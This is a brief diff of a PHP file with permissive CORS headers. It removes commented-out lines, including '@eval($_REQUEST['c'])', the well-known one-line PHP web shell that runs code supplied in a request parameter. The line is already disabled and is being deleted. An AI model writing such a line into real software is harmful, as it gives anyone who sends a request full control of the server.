@@ -5,14 +5,6 @@ header('Access-Control-Allow-Headers: *');
 header('Access-Control-Allow-Methods: *');
 //header("Content-Type: text/html;charset=GBK");
 
-//@eval($_REQUEST['c']);
-
-//ini_set("display_errors", 'Off');
-//error_reporting(0);
-//error_reporting(E_ALL^E_NOTICE^E_WARNING);
-//ini_set('always_populate_raw_post_data', -1);
-
-
 class File {
     function download() {
         $file = 'test.js';
